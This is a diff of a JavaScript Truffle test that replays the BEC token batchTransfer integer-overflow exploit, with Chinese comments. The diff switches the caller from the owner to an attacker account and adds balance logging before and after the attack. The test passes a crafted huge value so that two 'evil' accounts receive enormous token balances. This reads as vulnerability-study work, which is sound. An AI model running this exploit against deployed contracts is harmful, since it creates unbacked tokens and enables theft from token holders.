@@ -25,7 +25,7 @@ let evilNumberStr = "80000000000000000000000000000000000000000000000000000000000
 
 let evilNumber = new web3.BigNumber(STR0X + evilNumberStr);
 
-contract('BEC-Token溢出漏洞重放', function ([owner]) {
+contract('BEC-Token溢出漏洞重放', function ([owner,attacker]) {
     let token;
     let ret;
     let seq = 0;
@@ -41,8 +41,8 @@ contract('BEC-Token溢出漏洞重放', function ([owner]) {
 
     it('Case @ should have correct information', async function () {
         console.log(SPLong, 'Owner:', owner);
-        console.log(SPLong, "Evil Address 1", STR0X + evilAccounts0);
-        console.log(SPLong, "Evil Address 2", STR0X + evilAccounts1);
+        console.log(SPLong, "Evil Address 0", STR0X + evilAccounts0);
+        console.log(SPLong, "Evil Address 1", STR0X + evilAccounts1);
 
         const decimals = await token.decimals();
         const name = await token.name();
@@ -58,16 +58,19 @@ contract('BEC-Token溢出漏洞重放', function ([owner]) {
         assert.equal(ret.valueOf(), 0, "检查攻击前账户0的余额");
         
         ret = await token.balanceOf(STR0X + evilAccounts1);
-        console.log(SPLong, "balanceOf(", STR0X + evilAccounts0, ").toFix(0)    ", ret.toFixed(0));
+        console.log(SPLong, "攻击前：balanceOf(", STR0X + evilAccounts0, ").toFix(0)    ", ret.toFixed(0));
         assert.equal(ret.valueOf(), 0, "检查攻击前账户1的余额");
 
         /// @dev 开始实施溢出攻击
         await token.batchTransfer([STR0X + evilAccounts0, STR0X + evilAccounts1], evilNumber, {
-            from: owner
+            from: attacker
         });
         ret = await token.balanceOf(STR0X + evilAccounts0);
-        console.log(SPLong, "balanceOf(", STR0X + evilAccounts1, ").toString(10)", ret.toString(10));
-        console.log(SPLong, "balanceOf(", STR0X + evilAccounts1, ").toString(16)", ret.toString(16));
+        console.log(SPLong, "攻击后：balanceOf(", STR0X + evilAccounts0, ").toString(10)", ret.toString(10));
+        console.log(SPLong, "攻击后：balanceOf(", STR0X + evilAccounts0, ").toString(16)", ret.toString(16));
+        ret = await token.balanceOf(STR0X + evilAccounts1);
+        console.log(SPLong, "攻击后：balanceOf(", STR0X + evilAccounts1, ").toString(10)", ret.toString(10));
+        console.log(SPLong, "攻击后：balanceOf(", STR0X + evilAccounts1, ").toString(16)", ret.toString(16));
         ret.should.be.bignumber.equal(evilNumber); // 校验攻击后余额
     });
 
@@ -95,7 +98,7 @@ contract('BEC-Token溢出漏洞重放', function ([owner]) {
 
         /// @dev 开始实施溢出攻击
         let result = await web3.eth.sendTransaction({
-            from: owner,
+            from: attacker,
             gasPrice: 1,
             gas: 470000,
             to: token.address,
@@ -109,5 +112,12 @@ contract('BEC-Token溢出漏洞重放', function ([owner]) {
 
         ret = await token.balanceOf(STR0X + evilAccounts1); // bec的类型为BigNumber
         ret.should.be.bignumber.equal(evilNumber); // 校验攻击后账户1余额
+        
+        ret = await token.balanceOf(STR0X + evilAccounts0);
+        console.log(SPLong, "攻击后：balanceOf(", STR0X + evilAccounts0, ").toString(10)", ret.toString(10));
+        console.log(SPLong, "攻击后：balanceOf(", STR0X + evilAccounts0, ").toString(16)", ret.toString(16));
+        ret = await token.balanceOf(STR0X + evilAccounts1);
+        console.log(SPLong, "攻击后：balanceOf(", STR0X + evilAccounts1, ").toString(10)", ret.toString(10));
+        console.log(SPLong, "攻击后：balanceOf(", STR0X + evilAccounts1, ").toString(16)", ret.toString(16));
     });
 });
